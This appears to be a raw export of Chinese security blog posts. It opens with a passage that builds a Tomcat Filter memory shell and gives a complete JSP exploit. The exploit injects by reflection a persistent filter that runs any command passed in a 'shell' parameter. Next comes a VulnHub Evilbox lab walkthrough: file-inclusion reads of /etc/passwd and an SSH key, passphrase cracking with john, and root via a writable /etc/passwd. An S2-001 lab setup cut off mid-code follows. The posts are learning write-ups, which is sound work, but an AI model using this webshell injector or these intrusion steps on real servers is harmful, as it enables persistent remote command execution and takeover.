src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/4.png" class><p>跟进 internalDoFilter 方法</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/5.png" class><p>filters 是过滤器链数组，取数组的下标，遍历过滤器，赋值给filterConfig </p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/6.png" class><p>此时的过滤器为WsFilter 调用它的doFilter方法，跟进看一下</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/7.png" class><p>这里的判断 是否满足WebSocket握手的特殊条件，而且是否已经配置了相应的类来处理WebSocket连接，如果两个都不满足，然后回调用过滤器链中的下一个过滤器。继续跟进</p><p>又回到了 internalDoFilter 方法，此时pos&#x3D;2，不满足if条件。也就是说当过滤器遍历完后，就会调用 service 方法处理具体的业务请求</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/8.png" class><p>事实上可以定义多个过滤器，当拦截请求后，从filterChain 中一个个调用doFilter方法，最终执行 service 方法</p><p>那么Filter链是怎么一步步创建的，我们要注册一个恶意的Filter进去就需要了解Filter链的创建过程</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/9.png" class><p>通过执行流可以看到不断调用 invoke 方法，跟进最后一个 invoke方法，也就是 StandardWrapperValve 类的 invoke 方法，</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/10.png" class><p>这里已经创建好了 Filter链，往上翻代码，</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/11.png" class><p>createFilterChain 就是创建Filter链的重要方法，进入到这个方法下个断点，开始调试</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/12.png" class><p>这里实例化一个filterChain，设置了当前过滤器链中的 Servlet，然后获取当前 Servlet 包含在的上下文，从调式信息就可以看到是 StandardContext 对象，最后定义一个filterMaps 获取了当前上下文中的过滤器映射</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/13.png" class><p>此时的filterMaps就获取到了两个过滤器，到后面会对filterMaps进行两次遍历</p><p>这段代码的目的是将根据 URL 和 Servlet 名称匹配的过滤器配置添加到过滤器链中，以确保在请求处理过程中应用适当的过滤器。匹配过滤器配置时，会检查 Dispatcher 类型、URL 和 Servlet 名称，然后将匹配的过滤器配置添加到过滤器链中。如果没有匹配的过滤器配置，继续处理下一个过滤器映射</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/14.png" class><p>filterConfig 是通过调用context上下文的findFilterConfig方法获取，filterConfigs是一个Map，从里面拿</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/15.png" class><p>最后通过 addFilter 方法将过滤器添加到链中。</p><h3 id="2-攻击思路分析"><a href="#2-攻击思路分析" class="headerlink" title="2.攻击思路分析"></a>2.攻击思路分析</h3><p>过滤器是从filterConfigs这个Map里拿的，那么我们把恶意的Filter添加进 filterConfigs 里，等它取出来，添加到Filter链中就可以了，那么接下来怎么构造过滤器，也就是filterConfig，看调试信息 </p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/16.png" class><p>首先获取上下文context，然后就是自定义的filter代码，最后一个filterDef就是对应web.xml中对filter的配置，fiterConfig的相关内容都是从context中得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FilterDefs：存放 FilterDef 的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例</span><br><span class="line">等基本信息</span><br><span class="line">FilterConfigs：存放 filterConfig 的数组，在 FilterConfig 中主要存放 FilterDef 和</span><br><span class="line">Filter 对象等信息</span><br><span class="line">FilterMaps：存放 FilterMap 的数组，在 FilterMap 中主要存放了 FilterName 和 对</span><br><span class="line">应的 URLPattern</span><br></pre></td></tr></table></figure><p>所以只要我们将filter ，FilterDefs，FilterMaps添加到FilterConfigs中就可以添加filter了</p><p>贴上别的师傅的流程图</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/17.png" class><p>其中这里涉及到了几个类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServletContext：</span><br><span class="line">javax.servlet.ServletContextServlet规范中规定了的一个ServletContext接口，提供了Web应用所有Servlet的视图，通过它可以对某个Web应用的各种资源和功能进行访问。WEB容器在启动时，它会为每个Web应用程序都创建一个对应的ServletContext，它代表当前Web应用。并且它被所有客户端共享。 </span><br><span class="line"></span><br><span class="line">ApplicationContext：</span><br><span class="line">org.apache.catalina.core.ApplicationContext</span><br><span class="line">对应Tomcat容器，为了满足Servlet规范，必须包含一个ServletContext接口的实现。Tomcat的Context容器中都会包含一个ApplicationContext。</span><br><span class="line"></span><br><span class="line">StandardContext：</span><br><span class="line">Catalina主要包括Connector和Container，StandardContext就是一个Container，它主要负责对进入的用户请求进行处理。实际来说，不是由它来进行处理，而是交给内部的valve处理。</span><br><span class="line">一个context表示了一个外部应用，它包含多个wrapper，每个wrapper表示一个servlet定义。（Tomcat 默认的 Service 服务是 Catalina）</span><br></pre></td></tr></table></figure><p>引用师傅的解释，当前这是前面tomcat架构的内容，所以基础内容还是要了解。</p><h2 id="0x04-Filter内存马exp编写"><a href="#0x04-Filter内存马exp编写" class="headerlink" title="0x04 Filter内存马exp编写"></a>0x04 Filter内存马exp编写</h2><p>通过反射创建上面需要的几个对象</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContextFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//请求对象 request 中获取 ServletContext 对象。</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="comment">//ApplicationContextFacade 是 Spring 框架中的一个类，用于封装 Spring 的 Web 应用程序上下文。</span></span><br><span class="line">    <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) servletContext;</span><br><span class="line"><span class="comment">//通过反射获取上下文</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextFacadeContext</span> <span class="operator">=</span> applicationContextFacade.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextFacadeContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// context 字段，即 Spring 的应用程序上下文对象。通过反射获取到该字段的值，它被强制转换为 ApplicationContext 类型</span></span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFacadeContext.get(applicationContextFacade);</span><br><span class="line"><span class="comment">//从 ApplicationContext 类中获取一个名为 &quot;context&quot; 的私有字段。这个字段存储了实际的 Spring 应用程序上下文对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextContext</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//类型转换standardContext，标准的web应用程序上下文</span></span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) applicationContextContext.get(applicationContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建filterConfigs</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> (HashMap) filterConfigs.get(standardContext);</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;Filter&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (hashMap.get(filterName)==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="comment">//构造filter对象</span></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;filter初始化&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                servletRequest.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                servletResponse.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                servletResponse.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">                System.out.println(servletRequest.getParameter(<span class="string">&quot;shell&quot;</span>));</span><br><span class="line">                Runtime.getRuntime().exec(servletRequest.getParameter(<span class="string">&quot;shell&quot;</span>));</span><br><span class="line">                System.out.println(<span class="string">&quot;执行过滤&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//构造filterDef对象</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">//将过滤器的配置信息添加到应用程序上下文中</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造filterMap对象</span></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        <span class="comment">//添加映射的路由为所有请求</span></span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(filterName);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        <span class="comment">//将上述设置好的过滤器映射对象添加到 StandardContext 中，并将其插入到已有的过滤器映射之前</span></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造filterConfig</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//将filterConfig添加到filterConfigs中，即可完成注入</span></span><br><span class="line">        hashMap.put(filterName,applicationFilterConfig);</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;注入完成&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>为什么要写jsp文件，因为在实际场景中，可以通过文件上传漏洞将这个jsp马上传上去完成内存马的注入。注释上写了，分步编写exp。</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/18.png" class><p>注入成功后，我们对服务器访问任何请求，都会执行恶意代码。而且当jsp文件删除后，木马仍然有效。它存在当前的web应用上下文中，所以重启服务器就没了。</p><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/10888">https://xz.aliyun.com/t/10888</a></p><p><a href="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#0x06-%E5%B0%8F%E7%BB%93">https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#0x06-%E5%B0%8F%E7%BB%93</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Evilbox打靶记录</title>
      <link href="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><blockquote><p>局域网网段：192.168.19.0&#x2F;24</p><p>攻击机 kali：192.168.19.130&#x2F;24</p><p>目标机 Evilbox：192.168.47.132&#x2F;24</p></blockquote><h3 id="打靶目标"><a href="#打靶目标" class="headerlink" title="打靶目标"></a>打靶目标</h3><blockquote><p>拿下目标机器的root权限</p></blockquote><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>首先用nmap扫描出目标机器的ip</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/1.png" class><p>然后探测这个目标机开放了什么服务</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/2.png" class><p>开放了80端口和22端口，那么先从web服务入手。</p><p>游览器访问就是一个apache的默认页面，啥东西都没有，那么只能扫扫目录了，用dirb扫一下</p><p>dirb <a href="http://192.168.19.132/">http://192.168.19.132/</a></p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/3.png" class><p>扫出来的东西挺少的，简单的信息收集完成</p><h3 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h3><p>访问robots.txt也没什么信息，</p><h4 id="爆破子目录"><a href="#爆破子目录" class="headerlink" title="爆破子目录"></a>爆破子目录</h4><p>那么只能把目标放在secret目录下，该目录下可能会存在php文件，还是爆破</p><p>dirb <a href="http://192.168.19.132/secret">http://192.168.19.132/secret</a> -X .php</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/4.png" class><p>果然有东西，有个php文件，</p><h4 id="爆破参数值"><a href="#爆破参数值" class="headerlink" title="爆破参数值"></a>爆破参数值</h4><p>游览器访问是空白，这种情况下可能性太多，介于是靶场，会有接收输入的参数，那么接下来就用burp爆破参数名和输入，用burp自带的字典就可以</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/5.png" class><p>第一个参数选择服务端便变量名的字典</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/6.png" class><p>第二个参数就选择模糊-简单</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/7.png" class><p>那么开始爆破，果然爆破出了参数值</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/8.png" class><p>参数值为command，并且该php文件存在文件包含漏洞。</p><h4 id="利用文件包含读取敏感文件"><a href="#利用文件包含读取敏感文件" class="headerlink" title="利用文件包含读取敏感文件"></a>利用文件包含读取敏感文件</h4><p>存在文件包含漏洞，第一步尝试可不可以命令执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure><p>但是没有效果，可能 allow_url_include 的这些配置没有开，但是可以用 php:&#x2F;&#x2F;filter 文件读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure><p>解码后发现该文件就是一个纯的文件包含</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/9.png" class><p>只能读文件了，读取&#x2F;etc&#x2F;passwd</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/10.png" class><p>发现除了root还有一个普通用户mowree，另外22端口开放，想着能不能远程登录ssh</p><p>用burp遍历用户目录下的敏感文件，利用quickhits.txt 这个字典，github上可以下载</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/11.png" class><p>读取到ssh的私钥，可以利用这个私钥来登录mowree用户拿到shell</p><h4 id="登录ssh"><a href="#登录ssh" class="headerlink" title="登录ssh"></a>登录ssh</h4><p>把私钥下载下来，尝试远程登录</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/12.png" class><p>需要密码，</p><p>在生成 SSH 密钥对时，您可以选择为私钥添加一个密码，也称为密码短语（passphrase）。密码短语是一个用于保护私钥的字符串，当您使用私钥进行身份验证时，需要提供该密码短语以解锁私钥。这样可以增加私钥的安全性，即使私钥文件本身被盗或泄露，没有密码短语的话，私钥也无法使用。</p><p>只能尝试破解这个密码短语</p><p>利用 ssh2john 将ssh的私钥文件的格式转化成john工具处理的格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh2john id_rsa&gt;rsa</span><br></pre></td></tr></table></figure><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/13.png" class><p>然后用john爆破密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john rsa /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>rockyou.txt 是一个常用的密码字典文件路径，通常在许多 Linux 系统中用于密码破解和安全测试。这个文件包含了大量常见的密码、短语、词汇和字符组合，用于进行密码破解尝试和安全测试。</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/14.png" class><p>爆破出密码是unicorn，直接登录ssh</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/15.png" class><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>现在还不是root用户，要找找可以提权的地方，没有找到可以利用的suid的命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep pass</span><br></pre></td></tr></table></figure><p>这个命令是用来查找与密码路径有关的具有可写权限的文件</p><p>还真找到了，&#x2F;etc&#x2F;passwd具有可写权限</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/16.png" class><p>那么直接修改root的密码就可以了，首先自己生成一个</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/17.png" class><p>然后将root的密码替换成我们的就可以了。</p><img src="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/18.png" class><p>成功提权到root，vi编辑器真的把我恶心坏了。</p><p>重点应该就是考察敏感信息读取和利用。</p>]]></content>
      
      
      <categories>
          
          <category> 打靶记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2-S2-001漏洞复现</title>
      <link href="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Struts2简介"><a href="#0x01-Struts2简介" class="headerlink" title="0x01 Struts2简介"></a>0x01 Struts2简介</h2><p>Struts 2 是一个开源的 Java Web 应用程序开发框架，遵循MVC架构模式，用于构建基于 Java 技术的 Web 应用程序。它是 Apache Struts 框架的后续版本，旨在提供更现代、灵活和可扩展的方式来开发 Web 应用。Struts迭代至今已经出现很多版本，在这些版本中也存在许多RCE的漏洞。Struts 2也面临一个即将淘汰的局面。</p><h2 id="0x02-Struts2环境搭建"><a href="#0x02-Struts2环境搭建" class="headerlink" title="0x02 Struts2环境搭建"></a>0x02 Struts2环境搭建</h2><p>创建Maven项目，选择webapp</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" class><p>在pom.xml里导入 Struts2 的核心依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.0</span><span class="number">.8</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>然后修改web.xml，这里配置Struts2的过滤器</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;display-name&gt;S2<span class="number">-001</span> Example&lt;/display-name&gt;</span><br><span class="line">  &lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class&gt;</span><br><span class="line">  &lt;/filter&gt;</span><br><span class="line">  &lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;<span class="comment">/*&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="comment">  &lt;/filter-mapping&gt;</span></span><br><span class="line"><span class="comment">  &lt;welcome-file-list&gt;</span></span><br><span class="line"><span class="comment">    &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;</span></span><br><span class="line"><span class="comment">  &lt;/welcome-file-list&gt;</span></span><br><span class="line"><span class="comment">&lt;/web-app&gt;</span></span><br></pre></td></tr></table></figure><p>创建java类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.s2001.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">this</span>.username.isEmpty()) || (<span class="built_in">this</span>.password.isEmpty())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">this</span>.username.equalsIgnoreCase(<span class="string">&quot;admin&quot;</span>))</span><br><span class="line">                &amp;&amp; (<span class="built_in">this</span>.password.equals(<span class="string">&quot;admin&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Struts 2 框架中，<code>execute()</code> 是一个在 Action 类中的一个特定方法，用于处理请求。每当一个请求被发送到 Struts 2 应用程序，并且匹配了某个 Action 的映射时，<code>execute()</code> 方法会被调用来处理该请求。总之，<code>execute()</code> 方法在 Struts 2 中代表了一个 Action 类的入口点，用于处理请求和业务逻辑，并返回结果字符串来指导框架执行后续的页面导航或响应生成。</p><p>然后编写两个JSP页面</p><p>index.jsp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">         pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;</span><br><span 